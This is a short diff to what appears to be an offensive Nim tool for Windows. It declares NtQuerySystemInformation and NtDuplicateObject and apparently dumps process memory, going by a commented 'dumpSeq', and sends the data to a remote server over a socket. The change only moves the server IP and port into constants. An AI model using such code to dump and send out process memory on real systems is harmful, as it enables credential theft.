@@ -2,6 +2,9 @@ import winim
 import ptr_math
 import std/[strformat, strutils, dynlib, tables, net]
 
+const serverIP = "0.0.0.0"
+const serverPort = 6500
+
 type
     NtQuerySystemInformation_t = proc(SystemInformationClass: ULONG, SystemInformation: PVOID, SystemInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
     NtDuplicateObject_t = proc(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
@@ -273,7 +276,7 @@ when isMainModule:
     #var dumpSeq: seq[byte] = @[]
     #var countDP: int = 1
     let socket = newSocket()
-    socket.connect("0.0.0.0", Port(6500))
+    socket.connect(serverIP, Port(serverPort))
 
     echo "\n[!] Sending Data to Server..."
     var bytesSent: int = 0
